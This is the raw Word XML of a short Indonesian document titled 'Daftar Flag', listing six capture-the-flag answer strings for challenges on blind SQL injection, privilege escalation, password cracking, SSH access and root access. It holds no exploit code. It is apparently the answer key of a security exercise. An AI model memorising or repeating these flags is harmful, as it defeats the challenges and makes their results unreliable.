          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64AC518D" w14:textId="77777777" w:rsidR="00764298" w:rsidRDefault="00764298" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40120E70" w14:textId="77777777" w:rsidR="00D40418" w:rsidRDefault="00A97609" w:rsidP="00D40418">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D40418">
        <w:rPr>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Daftar Flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B2347D9" w14:textId="7388283F" w:rsidR="00FB7496" w:rsidRPr="00FB7496" w:rsidRDefault="00D40418" w:rsidP="00FB7496">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FB7496">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>FLAG(Javascript_ezpz)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6427029D" w14:textId="77777777" w:rsidR="00972D5E" w:rsidRPr="00972D5E" w:rsidRDefault="00444B9C" w:rsidP="00FB7496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335867">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="D63384"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>FLAG{0</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00335867">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="D63384"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>xSQL!nJecT</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00335867">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="D63384"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>!0n_Blind)</w:t>
      </w:r>
      <w:r w:rsidR="00D40418" w:rsidRPr="00FB7496">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="479C31E1" w14:textId="77777777" w:rsidR="00972D5E" w:rsidRPr="00972D5E" w:rsidRDefault="00972D5E" w:rsidP="00972D5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2D5E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="D63384"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>FLAG{0</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00972D5E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="D63384"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>xPr!vilege</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00972D5E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="D63384"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>3scalation_BAC)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD56DC0" w14:textId="77777777" w:rsidR="00972D5E" w:rsidRPr="00972D5E" w:rsidRDefault="00972D5E" w:rsidP="00972D5E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2642"/>
        </w:tabs>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00972D5E">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>FLAG{0xJ0hnCr4ckM3}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6417A92A" w14:textId="77777777" w:rsidR="00E70F16" w:rsidRPr="00E70F16" w:rsidRDefault="003A0C70" w:rsidP="00FB7496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E87B4D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>FLAG{0xLowUs3</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00E87B4D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>rw!thSSH</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00E87B4D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
      <w:r w:rsidR="00D40418" w:rsidRPr="00FB7496">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CCAA35D" w14:textId="13737E1D" w:rsidR="00D40418" w:rsidRPr="0072450D" w:rsidRDefault="00E70F16" w:rsidP="00FB7496">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0072450D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Flag</w:t>
      </w:r>
      <w:r w:rsidR="008B2F8C" w:rsidRPr="0072450D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
      <w:r w:rsidR="00123955" w:rsidRPr="0072450D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Root!</w:t>
      </w:r>
      <w:r w:rsidR="0072450D" w:rsidRPr="0072450D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>s34sy}</w:t>
      </w:r>
      <w:r w:rsidR="00D40418" w:rsidRPr="0072450D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B231359" w14:textId="34EA11C9" w:rsidR="00D40418" w:rsidRPr="00D40418" w:rsidRDefault="00D40418" w:rsidP="00D40418">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22E309A1" w14:textId="77777777" w:rsidR="00764298" w:rsidRDefault="00764298" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24F93003" w14:textId="77777777" w:rsidR="00CF54B0" w:rsidRDefault="00CF54B0" w:rsidP="00CF54B0"/>
    <w:p w14:paraId="14460847" w14:textId="77777777" w:rsidR="00CF54B0" w:rsidRDefault="00CF54B0" w:rsidP="00CF54B0"/>
    <w:p w14:paraId="045F5DB4" w14:textId="1AE134DA" w:rsidR="00CF54B0" w:rsidRDefault="00CF54B0" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0707C104" w14:textId="77777777" w:rsidR="009E0F34" w:rsidRPr="009E0F34" w:rsidRDefault="009E0F34" w:rsidP="009E0F34"/>
    <w:p w14:paraId="25903BC0" w14:textId="77777777" w:rsidR="009E0F34" w:rsidRPr="009E0F34" w:rsidRDefault="009E0F34" w:rsidP="009E0F34"/>
    <w:p w14:paraId="21FD92D2" w14:textId="77777777" w:rsidR="009E0F34" w:rsidRPr="009E0F34" w:rsidRDefault="009E0F34" w:rsidP="009E0F34"/>
    <w:p w14:paraId="5C230A3E" w14:textId="77777777" w:rsidR="009E0F34" w:rsidRPr="009E0F34" w:rsidRDefault="009E0F34" w:rsidP="009E0F34"/>
    <w:p w14:paraId="6B1FE464" w14:textId="77777777" w:rsidR="009E0F34" w:rsidRPr="009E0F34" w:rsidRDefault="009E0F34" w:rsidP="009E0F34"/>
    <w:p w14:paraId="5A911716" w14:textId="77777777" w:rsidR="009E0F34" w:rsidRPr="009E0F34" w:rsidRDefault="009E0F34" w:rsidP="009E0F34"/>
    <w:p w14:paraId="3AE3C0BB" w14:textId="77777777" w:rsidR="009E0F34" w:rsidRPr="009E0F34" w:rsidRDefault="009E0F34" w:rsidP="009E0F34"/>
    <w:p w14:paraId="2898C42B" w14:textId="77777777" w:rsidR="009E0F34" w:rsidRPr="009E0F34" w:rsidRDefault="009E0F34" w:rsidP="009E0F34"/>
    <w:p w14:paraId="3033E2B5" w14:textId="77777777" w:rsidR="009E0F34" w:rsidRPr="009E0F34" w:rsidRDefault="009E0F34" w:rsidP="009E0F34"/>
    <w:p w14:paraId="2B80680A" w14:textId="77777777" w:rsidR="009E0F34" w:rsidRPr="009E0F34" w:rsidRDefault="009E0F34" w:rsidP="009E0F34"/>
    <w:p w14:paraId="1BBDA0CC" w14:textId="77777777" w:rsidR="009E0F34" w:rsidRDefault="009E0F34" w:rsidP="009E0F34">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A7A16DA" w14:textId="77777777" w:rsidR="009E0F34" w:rsidRDefault="009E0F34" w:rsidP="009E0F34">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FD1E06F" w14:textId="5E60CC75" w:rsidR="00656224" w:rsidRPr="00656224" w:rsidRDefault="00656224" w:rsidP="00DF7D69">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1090"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="512BFFDD" w14:textId="5A5D0D5A" w:rsidR="00656224" w:rsidRDefault="00656224" w:rsidP="009B23D3">
      <w:p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7668D628" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="4751353D" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="33E99171" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="3E1E4BAB" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="483AD0AA" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="7C723B7B" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="2EC00F90" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="41A81F48" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="438AE30A" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="7F14A4CA" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="46200423" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="50FF76DE" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="0E8D8A07" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="5BEBA759" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="19329430" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="753B3CA3" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="0F3BE06F" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="1A9D8218" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="0A9EDECD" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="2FAC1B3E" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="5C43A2D7" w14:textId="77777777" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F"/>
    <w:p w14:paraId="68407ACB" w14:textId="77777777" w:rsidR="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F">
      <w:p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619FDD98" w14:textId="4D04EB8E" w:rsidR="0030370F" w:rsidRPr="0030370F" w:rsidRDefault="0030370F" w:rsidP="0030370F">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="5945"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="0030370F" w:rsidRPr="00303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9EFB9" w14:textId="77777777" w:rsidR="00B91CCB" w:rsidRDefault="00B91CCB" w:rsidP="002517E0">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="38F26CDD" w14:textId="77777777" w:rsidR="00B91CCB" w:rsidRDefault="00B91CCB" w:rsidP="002517E0">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationNotice" w:id="1">
    <w:p w14:paraId="123CFA93" w14:textId="77777777" w:rsidR="00B91CCB" w:rsidRDefault="00B91C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Bd BT">
    <w:panose1 w:val="020708030807060203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ECE2E" w14:textId="77777777" w:rsidR="00B91CCB" w:rsidRDefault="00B91CCB" w:rsidP="002517E0">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="7AAC98D5" w14:textId="77777777" w:rsidR="00B91CCB" w:rsidRDefault="00B91CCB" w:rsidP="002517E0">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationNotice" w:id="1">
    <w:p w14:paraId="48C49776" w14:textId="77777777" w:rsidR="00B91CCB" w:rsidRDefault="00B91CC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C569A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AF84C812"/>
    <w:lvl w:ilvl="0" w:tplc="E266EDA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943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516"/>
    <w:rsid w:val="000066AA"/>
    <w:rsid w:val="00013C56"/>
    <w:rsid w:val="00014CF6"/>
    <w:rsid w:val="000173EE"/>
    <w:rsid w:val="000266DA"/>
    <w:rsid w:val="000267AE"/>
    <w:rsid w:val="000403F5"/>
    <w:rsid w:val="00042325"/>
    <w:rsid w:val="0004496A"/>
    <w:rsid w:val="00057530"/>
    <w:rsid w:val="000606B5"/>
    <w:rsid w:val="00061BCA"/>
    <w:rsid w:val="0007665A"/>
    <w:rsid w:val="00082B18"/>
    <w:rsid w:val="0008331D"/>
    <w:rsid w:val="00083DBC"/>
    <w:rsid w:val="00095111"/>
    <w:rsid w:val="00096823"/>
    <w:rsid w:val="000B3789"/>
    <w:rsid w:val="000B4147"/>
    <w:rsid w:val="000C167E"/>
    <w:rsid w:val="000C2A00"/>
    <w:rsid w:val="000D20B1"/>
    <w:rsid w:val="000D2919"/>
    <w:rsid w:val="000F5722"/>
    <w:rsid w:val="000F717F"/>
    <w:rsid w:val="0010005E"/>
    <w:rsid w:val="0010084A"/>
    <w:rsid w:val="00100DB9"/>
    <w:rsid w:val="00103BC1"/>
    <w:rsid w:val="00110382"/>
    <w:rsid w:val="001153D2"/>
    <w:rsid w:val="001212CF"/>
    <w:rsid w:val="00121C8A"/>
    <w:rsid w:val="00123955"/>
    <w:rsid w:val="00152218"/>
    <w:rsid w:val="00164E7E"/>
    <w:rsid w:val="001723BE"/>
    <w:rsid w:val="001802A6"/>
    <w:rsid w:val="0018307C"/>
    <w:rsid w:val="00183B7F"/>
    <w:rsid w:val="00192BD3"/>
    <w:rsid w:val="00194142"/>
    <w:rsid w:val="001A1509"/>
    <w:rsid w:val="001A43EE"/>
    <w:rsid w:val="001A5E11"/>
    <w:rsid w:val="001D1D6D"/>
    <w:rsid w:val="001E31BF"/>
    <w:rsid w:val="001E6BF8"/>
    <w:rsid w:val="001F2626"/>
    <w:rsid w:val="001F26CD"/>
    <w:rsid w:val="00201AFF"/>
    <w:rsid w:val="0020788B"/>
    <w:rsid w:val="00217A09"/>
    <w:rsid w:val="00220D9C"/>
    <w:rsid w:val="002232F0"/>
    <w:rsid w:val="00235F13"/>
    <w:rsid w:val="002517E0"/>
    <w:rsid w:val="00256E91"/>
    <w:rsid w:val="00262EE4"/>
    <w:rsid w:val="00270352"/>
    <w:rsid w:val="00271AAB"/>
    <w:rsid w:val="00271E89"/>
    <w:rsid w:val="00271EB3"/>
    <w:rsid w:val="00272305"/>
    <w:rsid w:val="00277992"/>
    <w:rsid w:val="00287469"/>
    <w:rsid w:val="00290E67"/>
    <w:rsid w:val="00292E5E"/>
    <w:rsid w:val="002942FE"/>
    <w:rsid w:val="00294DAC"/>
    <w:rsid w:val="002A18B1"/>
    <w:rsid w:val="002C3919"/>
    <w:rsid w:val="002E71E2"/>
    <w:rsid w:val="002F2BCA"/>
    <w:rsid w:val="00301E1C"/>
    <w:rsid w:val="0030334B"/>
    <w:rsid w:val="0030370F"/>
    <w:rsid w:val="00316E83"/>
    <w:rsid w:val="0032602D"/>
    <w:rsid w:val="003261E7"/>
    <w:rsid w:val="00335867"/>
    <w:rsid w:val="00347286"/>
    <w:rsid w:val="00347C03"/>
    <w:rsid w:val="00353CD8"/>
    <w:rsid w:val="003674FB"/>
    <w:rsid w:val="0037553B"/>
    <w:rsid w:val="003769F6"/>
    <w:rsid w:val="003913A6"/>
    <w:rsid w:val="00392AC2"/>
    <w:rsid w:val="00397C8E"/>
    <w:rsid w:val="003A0C70"/>
    <w:rsid w:val="003B29BD"/>
    <w:rsid w:val="003B7F8C"/>
    <w:rsid w:val="003D4E57"/>
    <w:rsid w:val="003E0156"/>
    <w:rsid w:val="003E162A"/>
    <w:rsid w:val="003E4467"/>
    <w:rsid w:val="003F0B23"/>
    <w:rsid w:val="00423240"/>
    <w:rsid w:val="00436C42"/>
    <w:rsid w:val="00444B9C"/>
    <w:rsid w:val="00451516"/>
    <w:rsid w:val="004522ED"/>
    <w:rsid w:val="004529AF"/>
    <w:rsid w:val="00452DE3"/>
    <w:rsid w:val="00455D5A"/>
    <w:rsid w:val="0047203C"/>
    <w:rsid w:val="00481F56"/>
    <w:rsid w:val="004821EE"/>
    <w:rsid w:val="00485327"/>
    <w:rsid w:val="00496DDB"/>
    <w:rsid w:val="004A1B17"/>
    <w:rsid w:val="004A4836"/>
    <w:rsid w:val="004A4EB1"/>
    <w:rsid w:val="004B470D"/>
    <w:rsid w:val="004C27F7"/>
    <w:rsid w:val="004C7CDE"/>
    <w:rsid w:val="004D5EC9"/>
    <w:rsid w:val="004D61BE"/>
    <w:rsid w:val="004D6F8D"/>
    <w:rsid w:val="004F3DAF"/>
    <w:rsid w:val="004F7BF3"/>
    <w:rsid w:val="00501F19"/>
    <w:rsid w:val="00515A44"/>
    <w:rsid w:val="00523131"/>
    <w:rsid w:val="0052717F"/>
    <w:rsid w:val="00533C60"/>
    <w:rsid w:val="00534569"/>
    <w:rsid w:val="00537493"/>
    <w:rsid w:val="0054063E"/>
    <w:rsid w:val="005469B6"/>
    <w:rsid w:val="005475DF"/>
    <w:rsid w:val="005616E3"/>
    <w:rsid w:val="00562A67"/>
    <w:rsid w:val="00575E1E"/>
    <w:rsid w:val="00581B41"/>
    <w:rsid w:val="005913FA"/>
    <w:rsid w:val="005920D0"/>
    <w:rsid w:val="00594323"/>
    <w:rsid w:val="005956A1"/>
    <w:rsid w:val="00596C01"/>
    <w:rsid w:val="005974AE"/>
    <w:rsid w:val="005A49CB"/>
    <w:rsid w:val="005A71DD"/>
    <w:rsid w:val="005B2302"/>
    <w:rsid w:val="005C18D9"/>
    <w:rsid w:val="005C518A"/>
    <w:rsid w:val="005D220A"/>
    <w:rsid w:val="005D3C21"/>
    <w:rsid w:val="005D41A0"/>
    <w:rsid w:val="005F2078"/>
    <w:rsid w:val="005F4F9E"/>
    <w:rsid w:val="005F5ABA"/>
    <w:rsid w:val="00603A77"/>
    <w:rsid w:val="00610577"/>
    <w:rsid w:val="006105D3"/>
    <w:rsid w:val="00615EF6"/>
    <w:rsid w:val="00625AAB"/>
    <w:rsid w:val="00632A9F"/>
    <w:rsid w:val="00633588"/>
    <w:rsid w:val="00635BB2"/>
    <w:rsid w:val="00640C05"/>
    <w:rsid w:val="0064424C"/>
    <w:rsid w:val="0065561A"/>
    <w:rsid w:val="00656224"/>
    <w:rsid w:val="006814F3"/>
    <w:rsid w:val="006863F6"/>
    <w:rsid w:val="006866F4"/>
    <w:rsid w:val="00687D4D"/>
    <w:rsid w:val="006912F2"/>
    <w:rsid w:val="0069336D"/>
    <w:rsid w:val="0069520E"/>
    <w:rsid w:val="006A0A47"/>
    <w:rsid w:val="006A107E"/>
    <w:rsid w:val="006A1CCC"/>
    <w:rsid w:val="006A6D18"/>
    <w:rsid w:val="006A7F23"/>
    <w:rsid w:val="006C3414"/>
    <w:rsid w:val="006C60E5"/>
    <w:rsid w:val="006D08D3"/>
    <w:rsid w:val="006D5DBF"/>
    <w:rsid w:val="006F02DC"/>
    <w:rsid w:val="0070173E"/>
    <w:rsid w:val="007202B0"/>
    <w:rsid w:val="00722FF7"/>
    <w:rsid w:val="00723126"/>
    <w:rsid w:val="0072450D"/>
    <w:rsid w:val="007315E6"/>
    <w:rsid w:val="00735B03"/>
    <w:rsid w:val="0073612D"/>
    <w:rsid w:val="0074021E"/>
    <w:rsid w:val="00751E2A"/>
    <w:rsid w:val="00752B08"/>
    <w:rsid w:val="00764298"/>
    <w:rsid w:val="00764810"/>
    <w:rsid w:val="007739EB"/>
    <w:rsid w:val="00783907"/>
    <w:rsid w:val="00787E6B"/>
    <w:rsid w:val="007A3E0F"/>
    <w:rsid w:val="007A5239"/>
    <w:rsid w:val="007A5D4D"/>
    <w:rsid w:val="007A61D9"/>
    <w:rsid w:val="007A7885"/>
    <w:rsid w:val="007B44AE"/>
    <w:rsid w:val="007C113C"/>
    <w:rsid w:val="007C5E43"/>
    <w:rsid w:val="007D37BF"/>
    <w:rsid w:val="007D68AF"/>
    <w:rsid w:val="007E15A9"/>
    <w:rsid w:val="007F5A86"/>
    <w:rsid w:val="007F71D6"/>
    <w:rsid w:val="008041C0"/>
    <w:rsid w:val="0081464C"/>
    <w:rsid w:val="00814D02"/>
    <w:rsid w:val="00815EFB"/>
    <w:rsid w:val="00820755"/>
    <w:rsid w:val="0083667B"/>
    <w:rsid w:val="00842D30"/>
    <w:rsid w:val="00853159"/>
    <w:rsid w:val="00856828"/>
    <w:rsid w:val="008656C6"/>
    <w:rsid w:val="00870ECA"/>
    <w:rsid w:val="00877C07"/>
    <w:rsid w:val="00890B48"/>
    <w:rsid w:val="008B2F8C"/>
    <w:rsid w:val="008C3B13"/>
    <w:rsid w:val="008D0B83"/>
    <w:rsid w:val="008E3D80"/>
    <w:rsid w:val="008E4C8F"/>
    <w:rsid w:val="008E6752"/>
    <w:rsid w:val="00901B5E"/>
    <w:rsid w:val="009059C0"/>
    <w:rsid w:val="00922F0B"/>
    <w:rsid w:val="00942E21"/>
    <w:rsid w:val="00943F03"/>
    <w:rsid w:val="00964574"/>
    <w:rsid w:val="00972D5E"/>
    <w:rsid w:val="00975279"/>
    <w:rsid w:val="00982808"/>
    <w:rsid w:val="00991E6C"/>
    <w:rsid w:val="00992717"/>
    <w:rsid w:val="00994988"/>
    <w:rsid w:val="009A4E8A"/>
    <w:rsid w:val="009A63AA"/>
    <w:rsid w:val="009A78AD"/>
    <w:rsid w:val="009B23D3"/>
    <w:rsid w:val="009C03E5"/>
    <w:rsid w:val="009C6AA3"/>
    <w:rsid w:val="009C7C07"/>
    <w:rsid w:val="009D0522"/>
    <w:rsid w:val="009E0F34"/>
    <w:rsid w:val="009E103D"/>
    <w:rsid w:val="009E1636"/>
    <w:rsid w:val="009E50C4"/>
    <w:rsid w:val="009F2872"/>
    <w:rsid w:val="009F49EC"/>
    <w:rsid w:val="00A022A2"/>
    <w:rsid w:val="00A06B25"/>
    <w:rsid w:val="00A13B31"/>
    <w:rsid w:val="00A23B1E"/>
    <w:rsid w:val="00A24C17"/>
    <w:rsid w:val="00A25EC6"/>
    <w:rsid w:val="00A42DB5"/>
    <w:rsid w:val="00A51723"/>
    <w:rsid w:val="00A554B5"/>
    <w:rsid w:val="00A63E3B"/>
    <w:rsid w:val="00A65E0F"/>
    <w:rsid w:val="00A71A24"/>
    <w:rsid w:val="00A72C94"/>
    <w:rsid w:val="00A753C9"/>
    <w:rsid w:val="00A82009"/>
    <w:rsid w:val="00A84679"/>
    <w:rsid w:val="00A92F22"/>
